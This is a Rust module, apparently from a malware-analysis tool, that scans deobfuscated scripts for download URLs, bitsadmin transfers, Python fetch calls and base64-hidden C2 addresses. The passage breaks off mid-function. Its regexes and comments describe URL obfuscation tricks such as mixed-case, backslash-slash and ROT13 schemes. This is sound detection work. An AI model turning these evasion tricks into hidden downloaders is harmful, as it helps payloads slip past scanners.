//! Final URL sweep over the deobfuscated batch text. Catches URLs that
//! were normalized into the output but didn't pass through any specific
//! handler (set values, echo content, start arguments, etc.).
//!
//! Dedups against URLs already surfaced by Download/CertutilDownload/
//! BitsadminDownload traits.

#![allow(clippy::expect_used, clippy::type_complexity, clippy::unwrap_used)]

use crate::env::Environment;
use crate::handlers::util::{split_words, windows_basename};
use crate::traits::Trait;
use crate::util::{
    contains_ascii_case_insensitive, ends_with_ascii_case_insensitive,
    find_ascii_case_insensitive_from, floor_char_boundary, looks_like_liberal_url, snippet_prefix,
    starts_with_ascii_case_insensitive, strip_ascii_case_insensitive_prefix, strip_outer_quotes,
};
use once_cell::sync::Lazy;
use regex::Regex;

#[allow(clippy::expect_used)]
// Case-insensitive AND tolerant of Windows' liberal slash normalization:
// WinINet / IE / PS Invoke-WebRequest all accept `http:\\evil.com`,
// `http:/evil.com`, `http:\/evil.com`, `http:////evil.com` etc. — any
// run of one or more `/` or `\` after the colon. Obfuscators exploit
// this with `hTtPs:\\` to dodge naive `https://` scanners.
// `[\x2f\x5c]+` = one-or-more forward-slash or backslash.
pub(crate) static URL_RE: Lazy<Regex> = Lazy::new(|| {
    // Also exclude `;` (PS statement separator), backtick (PS escape),
    // and comma — these terminate URLs in real CMD/PS source.
    Regex::new(r#"(?i)\b(https?:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|ftp:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|file:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)"#)
        .expect("url sweep regex")
});

#[allow(clippy::expect_used)]
static ROT13_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(uggcf?:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|sgc:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|svyr:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)"#)
        .expect("rot13 url sweep regex")
});

#[allow(clippy::expect_used)]
static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches:  \\<host>@<port>\<share>...
    // Where host is IP or hostname, port is digits or "SSL", share is anything non-whitespace
    Regex::new(r"(?i)\\\\([A-Za-z0-9.\-]+)@([A-Za-z0-9]+)\\([A-Za-z0-9._\-/\\]+)")
        .expect("unc webdav regex")
});

#[allow(clippy::expect_used)]
static BITSADMIN_WORD_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)\bbitsadmin(?:\.exe)?\b").expect("bitsadmin word regex"));

#[allow(clippy::expect_used)]
static CMD_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bset\s+"?([A-Za-z_][A-Za-z0-9_.$-]*)\s*=\s*['"]?((?:https?|ftp|file):[\x2f\x5c]+[^"'\s]+)"#,
    )
    .expect("cmd URL variable regex")
});

#[allow(clippy::expect_used)]
static PS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']((?:https?|ftp|file):[\x2f\x5c]+[^"']+)["']"#,
    )
    .expect("PowerShell URL variable regex")
});

#[allow(clippy::expect_used)]
static EMBEDDED_POWERSHELL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:[A-Za-z]:\\[^\s"']*\\)?(?:powershell|pwsh)(?:\.exe)?\b"#)
        .expect("embedded PowerShell regex")
});

#[allow(clippy::expect_used)]
// Same URL-char restrictions as URL_RE: exclude shell/PS terminators
// (`;`, `,`, `)`, `(`, etc.) so `... 'URL'); other-stmt` doesn't capture
// past the URL into the next statement.
static PROCESS_URL_ARG_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:^|[\s(])(?:[A-Za-z]:\\)?[^\s"()]+?\.(?:exe|com|scr|bat|cmd)\s+["']((?:https?|file):[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)["']"#)
        .expect("process URL argument regex")
});

#[allow(clippy::expect_used)]
static B64_INLINE_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: FromBase64String('...') or FromBase64String("...").
    // Upper bound 8000 chars (~6 KB decoded) so we still catch the
    // Data.ps1 / Datanew.ps1 / yenisc2.ps1 / stub.ps1 family where the
    // whole script is one FromBase64String literal carrying the C2
    // URLs inside the decoded PS body. Keep a cap so a 5 MB blob
    // doesn't pin us in a doomed base64-decode loop.
    Regex::new(r#"FromBase64String\s*\(\s*["']([A-Za-z0-9+/=]{20,8000})["']\s*\)"#)
        .expect("b64 inline regex")
});

/// Returns true for well-known noise URLs that appear in binary-embedded
/// certificate metadata, XMP image data, or ad-network assets.
/// Returns true for IP literals that should not be treated as C2: private
/// RFC1918 ranges, loopback, link-local, multicast, broadcast, and the
/// unspecified address. Called from sweeps that emit `http://<ip>/...`
/// URLs.
fn is_noise_ip(ip_url: &str) -> bool {
    // url is of form http(s)://<ip>[:port][/path]. Case-insensitive
    // scheme + Windows-liberal slashes (`HTTPS://`, `http:\\`, `http:/`).
    let rest = ["http:", "https:"]
        .iter()
        .find_map(|scheme| strip_ascii_case_insensitive_prefix(ip_url, scheme));
    let Some(rest) = rest else { return false };
    let rest = rest.trim_start_matches(['/', '\\']);
    // Take everything up to ':', '/', '\', or end.
    let host = rest.split([':', '/', '\\']).next().unwrap_or("");
    let mut parts = host.split('.');
    let (Some(a), Some(b), Some(_c), Some(_d)) = (
        parts.next().and_then(|p| p.parse::<u8>().ok()),
        parts.next().and_then(|p| p.parse::<u8>().ok()),
        parts.next().and_then(|p| p.parse::<u8>().ok()),
        parts.next().and_then(|p| p.parse::<u8>().ok()),
    ) else {
        return false;
    };
    if parts.next().is_some() {
        return false;
    }
    match (a, b) {
        (0, _) => true,         // 0.0.0.0/8
        (10, _) => true,        // RFC1918
        (127, _) => true,       // loopback
        (169, 254) => true,     // link-local
        (172, 16..=31) => true, // RFC1918
        (192, 168) => true,     // RFC1918
        (224..=239, _) => true, // multicast
        (240..=255, _) => true, // reserved + broadcast
        _ => false,
    }
}

pub fn is_noise_url(url: &str) -> bool {
    if is_noise_ip(url) {
        return true;
    }
    if has_bare_non_ip_host(url) {
        return true;
    }
    if url.as_bytes().iter().any(|b| b.is_ascii_control()) || url.contains('\u{fffd}') {
        return true;
    }
    // Unresolved FOR-loop variable (`%%X`) or stray bare `%` in the URL —
    // the parser couldn't expand a runtime-bound value, so the URL has a
    // literal `%%B` / `%%I` etc. in its host or path. win.bat
    // (fb8bb3cf…) used `for /f ... in ('ping …')` whose pipeline can't
    // resolve statically, leaving `set ipaddress=%%B` → `set url=http://%%B`.
    // Report it as a NetworkProbe or similar at most, not as a real URL IOC.
    if url.contains("%%") {
        return true;
    }
    // A single bare `%` followed by an unresolved var name suggests the
    // var lookup silently dropped (e.g. `http://%publicIP%/`).
    if url.contains('%') {
        // Allow `%XX` URL-encoded escapes; reject `%NAME` style.
        let bytes = url.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'%' {
                let n1 = bytes.get(i + 1).copied();
                let n2 = bytes.get(i + 2).copied();
                let is_hex_pair = matches!(n1, Some(c) if c.is_ascii_hexdigit())
                    && matches!(n2, Some(c) if c.is_ascii_hexdigit());
                if !is_hex_pair {
                    return true;
                }
                i += 3;
                continue;
            }
            i += 1;
        }
    }
    if NOISE_EXACT_URLS
        .iter()
        .any(|candidate| url.eq_ignore_ascii_case(candidate))
    {
        return true;
    }
    if NOISE_URL_PREFIXES
        .iter()
        .any(|prefix| starts_with_ascii_case_insensitive(url, prefix))
    {
        return true;
    }
    if NOISE_URL_SUBSTRINGS
        .iter()
        .any(|needle| contains_ascii_case_insensitive(url, needle))
    {
        return true;
    }
    false
}

// Exact URL strings (lowercase) that appear in corpus samples as embedded
// page assets or attribution links — never C2.
const NOISE_EXACT_URLS: &[&str] = &[
    // GitHub embed / scrape leakage
    "https://github.githubassets.com",
    "https://avatars.githubusercontent.com",
    "https://github-cloud.s3.amazonaws.com",
    "https://user-images.githubusercontent.com",
    "https://desktop.github.com",
    "https://docs.github.com",
    "https://raw.githubuserc", // truncated capture in some samples
    "https://github.com",
    "https://github.com/features",
    "https://github.com/topics",
    "https://github.com/trending",
    "https://github.com/collections",
    "https://github.com/security",
    "https://github.com/enterprise",
    "https://github.com/team",
    "https://github.com/readme",
    "https://github.blog",
    "https://skills.github.com",
    "https://resources.github.com",
    "https://partner.github.com",
    "https://github.com/fluidicon.png",
    "https://github.com/ch2sh/batcloak",
    "https://github.com/baum1810",
    "https://massgrave.dev/troubleshoot",
    // XML / schema absolutes
    "http://www.w3.org/2000/svg",
    "http://schema.org/softwaresourcecode",
    "http://www.w3.org/2001/xmlschema-instance",
    // Microsoft / SysInternals attribution
    "http://www.microsoft.com/exporting",
    "https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation",
    "https://learn.microsoft.com/windows/win32/fileio/maximum-file-path-limitation",
    "http://technet.microsoft.com/sysinternals",
    "http://www.sysinternals.com",
    "https://www.sysinternals.com",
    "https://www.sysinternals.com0",
    "http://www.microsoft.com/drm/sl/genuineauthorization/1.0",
    // Vendor attribution
    "http://sawebservice.red-gate.com/",
];

// URL prefixes (lowercase). Hostname-or-path noise that appears with any
// trailing chars but the leading path identifies it as page asset / legal
// boilerplate.
const NOISE_URL_PREFIXES: &[&str] = &[
    "https://docs.github.com/",
    "https://resources.github.com/",
    "https://support.github.com",
    "https://www.githubstatus.com/",
    "https://github.com/features/",
    "https://github.com/about/",
    "https://github.com/customer-stories",
    "https://github.com/solutions/",
    "https://github.com/enterprise/",
    "https://github.com/resources/",
    "https://github.com/pricing",
    "https://github.com/login",
    "https://github.com/signup",
    "https://github.com/topics/",
    "http://www.apache.org/licenses/",
];

// URL substrings (lowercase). Used for hostnames / paths that show up
// anywhere within the URL — typically embedded cert-chain noise leaking out
// of DER-encoded blobs partially decoded into text.
const NOISE_URL_SUBSTRINGS: &[&str] = &[
    // GitHub page-asset hosts (caught via "host/" substring even when the
    // full URL has any path).
    "github.githubassets.com/",
    "avatars.githubusercontent.com/",
    "github-cloud.s3.amazonaws.com/",
    "user-images.githubusercontent.com/",
    "opengraph.githubassets.com/",
    "collector.github.com/",
    "api.github.com/_private/browser/",
    // X.509 cert chain noise from PE certificate tables surfaced as text
    "digicert.com/cps",
    "digicert.com/crl",
    "ocsp.digicert.com",
    "crl.digicert.com",
    "ocsp.usertrust.com",
    "crl.usertrust.com",
    "crl.microsoft.com",
    "ocsp.microsoft.com",
    "microsoft.com/pki/certs/",
    "crt.sectigo.com",
    "ocsp.sectigo.com",
    "crl.sectigo.com",
    "sectigo.com/cps",
    "ocsp.thawte.com",
    "ocsp.verisign.com",
    "verisign.com/rpa",
    "logo.verisign.com/",
    "crl.verisign.com/",
    "csc3-2010-crl.verisign.com/",
    "ts-ocsp.ws.symantec.com",
    "ts-aia.ws.symantec.com",
    "ts-crl.ws.symantec.com",
    "d.symcb.com/",
    "s.symcb.com/",
    "ocsp.comodoca.com",
    "secure.comodo.net/cps",
    // NSIS installer error page — appears in every NSIS-built dropper PE
    // tail (43 corpus samples are PE-renamed `.bat`); pure infrastructure
    // URL, not the malware's C2.
    "nsis.sf.net/nsis_error",
    "s.symcd.com",
    "ts-ocsp.thawte.com",
    "ts-aia.thawte.com",
    "ts-crl.thawte.com",
    "ocsp.thawte.com",
    // XMP / image metadata URIs
    "ns.adobe.com/",
    "purl.org/dc/",
    "w3.org/1999/02/22-rdf-syntax-ns",
    "w3.org/xml/1998/namespace",
    "schemas.microsoft.com/",
    "schemas.dmtf.org/wbem/wsman/",
    "iptc.org/std/",
    "xmp.gettyimages.com/",
    "ns.useplus.org/",
    "red-gate.com/products/dotnet-development/smartassembly",
    // Stock photo / template attribution
    "istockphoto.com/legal/license-agreement",
    "istockphoto.com/photo/license",
    // Common ad networks / analytics in legitimate page assets
    "doubleclick.net",
    "googletagmanager.com",
    "google-analytics.com",
];

fn has_bare_non_ip_host(url: &str) -> bool {
    // Case-insensitive scheme + tolerate Windows-liberal slashes
    // (`http:\\X`, `http:/X`, `http:////X`) — `strip_prefix("http://")`
    // alone would miss `HTTP://`/`hTtPs://`/`http:\\` etc.
    let rest = ["http:", "https:", "ftp:"]
        .iter()
        .find_map(|scheme| strip_ascii_case_insensitive_prefix(url, scheme));
    let Some(rest) = rest else { return false };
    let rest = rest.trim_start_matches(['/', '\\']);
    let host = rest.split([':', '/', '?', '#', '\\']).next().unwrap_or("");
    if host.is_empty() || host.eq_ignore_ascii_case("localhost") {
        return true;
    }
    if host.parse::<std::net::IpAddr>().is_ok() {
        return false;
    }
    !host.contains('.')
}

fn is_known_or_known_query_prefix(known: &std::collections::HashSet<String>, url: &str) -> bool {
    if known.contains(url) {
        return true;
    }
    known.iter().any(|known_url| {
        known_url.strip_prefix(url).is_some_and(|suffix| {
            suffix.starts_with('&')
                || suffix.starts_with('?')
                || (url.eq_ignore_ascii_case("https://api.telegram.org/bot") && !suffix.is_empty())
        })
    })
}

pub(crate) fn is_noise_url_context(line: &str, url: &str) -> bool {
    const GITHUB_PREFIX: &str = "https://github.com/";
    const GIT_SUFFIX: &str = ".git";
    if contains_ascii_case_insensitive(line, r#"<meta name="go-import""#)
        && starts_with_ascii_case_insensitive(url, GITHUB_PREFIX)
        && ends_with_ascii_case_insensitive(url, GIT_SUFFIX)
    {
        return true;
    }
    false
}

pub(crate) fn normalize_liberal_url_token(token: &str) -> Option<String> {
    let mut token = strip_outer_quotes(token);
    let end = token
        .as_bytes()
        .iter()
        .position(|b| {
            matches!(
                b,
                b'"' | b'\'' | b')' | b']' | b'}' | b';' | b',' | b'`' | b'<' | b'>'
            )
        })
        .unwrap_or(token.len());
    token = &token[..end];
    token = token.trim_end_matches(['.', ',', ';', ':', '\\']);

    for scheme in ["http:", "https:", "ftp:", "file:"] {
        let Some(raw_rest) = strip_ascii_case_insensitive_prefix(token, scheme) else {
            continue;
        };
        if !raw_rest.starts_with(['/', '\\']) {
            continue;
        }
        if scheme == "file:" {
            let slash_count = raw_rest
                .as_bytes()
                .iter()
                .take_while(|b| matches!(b, b'/' | b'\\'))
                .count();
            let rest = raw_rest.trim_start_matches(['/', '\\']).replace('\\', "/");
            if rest.is_empty() {
                return None;
            }
            if slash_count >= 2 && !rest.as_bytes().get(1).is_some_and(|b| *b == b':') {
                return Some(format!("file://{rest}"));
            }
            return Some(format!("file:///{rest}"));
        }
        let rest = raw_rest.trim_start_matches(['/', '\\']);
        if rest.is_empty() {
            return None;
        }
        return Some(format!("{}//{}", scheme, rest.replace('\\', "/")));
    }
    None
}

fn contains_liberal_url_scheme(text: &str) -> bool {
    ["http:", "https:", "ftp:", "file:"]
        .iter()
        .any(|scheme| contains_ascii_case_insensitive(text, scheme))
}

fn scan_bitsadmin_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if (!contains_ascii_case_insensitive(line, "/transfer")
            && !contains_ascii_case_insensitive(line, "-transfer")
            && !contains_ascii_case_insensitive(line, "/addfile")
            && !contains_ascii_case_insensitive(line, "-addfile"))
            || !contains_ascii_case_insensitive(line, "bitsadmin")
        {
            continue;
        }

        for bits_match in BITSADMIN_WORD_RE.find_iter(line) {
            let tail = &line[bits_match.start()..];
            let segment = tail.split('&').next().unwrap_or(tail);
            let tokens = split_words(segment);
            if !tokens
                .iter()
                .any(|t| bitsadmin_flag_eq(t, "transfer") || bitsadmin_flag_eq(t, "addfile"))
            {
                continue;
            }

            let mut i = 1;
            while i < tokens.len() {
                let token = strip_outer_quotes(&tokens[i]).to_string();
                if bitsadmin_flag_eq(&token, "priority") {
                    i += 2;
                    continue;
                }
                if is_bitsadmin_option(&token) || token.eq_ignore_ascii_case("foreground") {
                    i += 1;
                    continue;
                }
                if let Some(url) = normalize_liberal_url_token(&token) {
                    let dst = bitsadmin_dst_after_url(&tokens, i + 1).unwrap_or_default();
                    if known.insert(url.clone()) {
                        env.traits.push(Trait::BitsadminDownload { url, dst });
                    }
                    i += 2;
                    continue;
                }
                i += 1;
            }
        }
    }
}

fn bitsadmin_dst_after_url(tokens: &[String], start: usize) -> Option<String> {
    let mut i = start;
    while i < tokens.len() {
        let token = strip_outer_quotes(&tokens[i]).to_string();
        if bitsadmin_flag_eq(&token, "priority") {
            i += 2;
            continue;
        }
        if is_bitsadmin_option(&token) || token.eq_ignore_ascii_case("foreground") {
            i += 1;
            continue;
        }
        return Some(token);
    }
    None
}

fn bitsadmin_flag_eq(token: &str, flag: &str) -> bool {
    token
        .strip_prefix(['/', '-'])
        .is_some_and(|value| value.eq_ignore_ascii_case(flag))
}

fn is_bitsadmin_option(token: &str) -> bool {
    token.starts_with('/') || token.starts_with('-')
}

fn scan_python_requests_get_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    let urlopen_names = python_urlopen_call_names(deobfuscated);
    let urlopen_name_refs = urlopen_names.iter().map(String::as_str).collect::<Vec<_>>();
    for url in find_call_url_literals(deobfuscated, &urlopen_name_refs) {
        emit_python_download(&url, deobfuscated, env, &mut known);
    }
    for (url, dst) in find_python_urlretrieve_literals(deobfuscated) {
        emit_python_download_with_dst(&url, dst.as_deref(), deobfuscated, env, &mut known);
    }

    for decoded in decoded_python_b64decode_literals(deobfuscated) {
        let decoded_urlopen_names = python_urlopen_call_names(&decoded);
        let decoded_urlopen_name_refs = decoded_urlopen_names
            .iter()
            .map(String::as_str)
            .collect::<Vec<_>>();
        for url in find_call_url_literals(&decoded, &decoded_urlopen_name_refs) {
            emit_python_download(&url, &decoded, env, &mut known);
        }
        for (url, dst) in find_python_urlretrieve_literals(&decoded) {
            emit_python_download_with_dst(&url, dst.as_deref(), &decoded, env, &mut known);
        }
    }
}

fn python_urlopen_call_names(text: &str) -> Vec<String> {
    let mut names = vec![
        "requests.get".to_string(),
        "urllib.request.urlopen".to_string(),
        "urllib.urlopen".to_string(),
    ];
    names.extend(collect_python_requests_get_aliases(text));
    names.extend(collect_python_urllib_call_aliases(text, "urlopen"));
    names
}

fn collect_python_requests_get_aliases(text: &str) -> Vec<String> {
    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python requests import alias regex")
    });
    static PY_FROM_REQUESTS_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+requests\s+import\s+([^;"'\r\n]+)"#)
            .expect("python requests from import regex")
    });

    let mut aliases = PY_IMPORT_REQUESTS_ALIAS_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| caps.get(1).map(|m| format!("{}.get", m.as_str())))
        .collect::<Vec<_>>();
    for caps in PY_FROM_REQUESTS_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words = part.split_ascii_whitespace().collect::<Vec<_>>();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if method != "get" {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.push(alias.to_string());
            }
        }
    }
    aliases
}

fn decoded_python_b64decode_literals(deobfuscated: &str) -> Vec<String> {
    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
    static PY_B64DECODE_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)(?:base64|__import__\(\s*['"]base64['"]\s*\))\.(b64decode|urlsafe_b64decode)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
            ),
        )
        .expect("python b64decode literal regex")
    });
    static PY_B64DECODE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:base64|__import__\(\s*['"]base64['"]\s*\))\.(b64decode|urlsafe_b64decode)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
        )
        .expect("python b64decode variable regex")
    });
    static PY_B64DECODE_MODULE_ALIAS_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
            ),
        )
        .expect("python b64decode module alias literal regex")
    });
    static PY_B64DECODE_MODULE_ALIAS_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
        )
        .expect("python b64decode module alias variable regex")
    });
    static PY_B64DECODE_ALIAS_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
            ),
        )
        .expect("python b64decode alias literal regex")
    });
    static PY_B64DECODE_ALIAS_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
        )
        .expect("python b64decode alias variable regex")
    });

    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in PY_B64DECODE_LITERAL_RE.captures_iter(deobfuscated).take(16) {
        let Some(method) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    let bindings = collect_python_b64_string_bindings(deobfuscated);
    let module_aliases = collect_python_base64_module_aliases(deobfuscated);
    let decoder_aliases = collect_python_base64_decoder_aliases(deobfuscated, &module_aliases);
    for caps in PY_B64DECODE_VAR_RE.captures_iter(deobfuscated).take(16) {
        let Some(method) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(name) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = bindings.get(name).map(String::as_str) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_MODULE_ALIAS_LITERAL_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(module_name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !module_aliases.contains(module_name) {
            continue;
        }
        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(4)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_MODULE_ALIAS_VAR_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(module_name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !module_aliases.contains(module_name) {
            continue;
        }
        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(var_name) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = bindings.get(var_name).map(String::as_str) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(4)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_ALIAS_LITERAL_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(method) = decoder_aliases.get(name).map(String::as_str) else {
            continue;
        };
        let Some(b64) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_ALIAS_VAR_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(method) = decoder_aliases.get(name).map(String::as_str) else {
            continue;
        };
        let Some(var_name) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = bindings.get(var_name).map(String::as_str) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }
    out
}

fn collect_python_base64_module_aliases(deobfuscated: &str) -> std::collections::HashSet<String> {
    static PY_IMPORT_BASE64_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+base64\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python import base64 alias regex")
    });

    let mut aliases = std::collections::HashSet::new();
    aliases.insert("base64".to_string());
    for caps in PY_IMPORT_BASE64_ALIAS_RE
        .captures_iter(deobfuscated)
        .take(16)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        aliases.insert(alias.to_string());
    }
    aliases
}

fn collect_python_base64_decoder_aliases(
    deobfuscated: &str,
    module_aliases: &std::collections::HashSet<String>,
) -> std::collections::HashMap<String, String> {
    static PY_FROM_BASE64_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+base64\s+import\s+([^;"'\r\n]+)"#)
            .expect("python from base64 import regex")
    });
    static PY_BASE64_DECODER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\b"#,
        )
        .expect("python base64 decoder assignment regex")
    });
    static PY_DUNDER_IMPORT_BASE64_DECODER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*__import__\(\s*['"]base64['"]\s*\)\.(b64decode|urlsafe_b64decode)\b"#,
        )
        .expect("python __import__ base64 decoder assignment regex")
    });

    let mut aliases = std::collections::HashMap::new();
    for caps in PY_FROM_BASE64_IMPORT_RE.captures_iter(deobfuscated).take(8) {
        let Some(imports) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            if part == "*" {
                aliases.insert("b64decode".to_string(), "b64decode".to_string());
                aliases.insert(
                    "urlsafe_b64decode".to_string(),
                    "urlsafe_b64decode".to_string(),
                );
                continue;
            }
            let words = part.split_ascii_whitespace().collect::<Vec<_>>();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if !matches!(method, "b64decode" | "urlsafe_b64decode") {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.insert(alias.to_string(), method.to_string());
            }
        }
    }
    for caps in PY_BASE64_DECODER_ASSIGN_RE
        .captures_iter(deobfuscated)
        .take(16)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !is_python_identifier(alias) {
            continue;
        }
        let Some(module_name) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        if !module_aliases.contains(module_name) {
            continue;
        }
        let Some(method) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        aliases.insert(alias.to_string(), method.to_string());
    }
    for caps in PY_DUNDER_IMPORT_BASE64_DECODER_ASSIGN_RE
        .captures_iter(deobfuscated)
        .take(16)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !is_python_identifier(alias) {
            continue;
        }
        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        aliases.insert(alias.to_string(), method.to_string());
    }
    aliases
}

fn collect_python_b64_string_bindings(
    deobfuscated: &str,
) -> std::collections::HashMap<String, String> {
    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
    static PY_STRING_BINDING_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
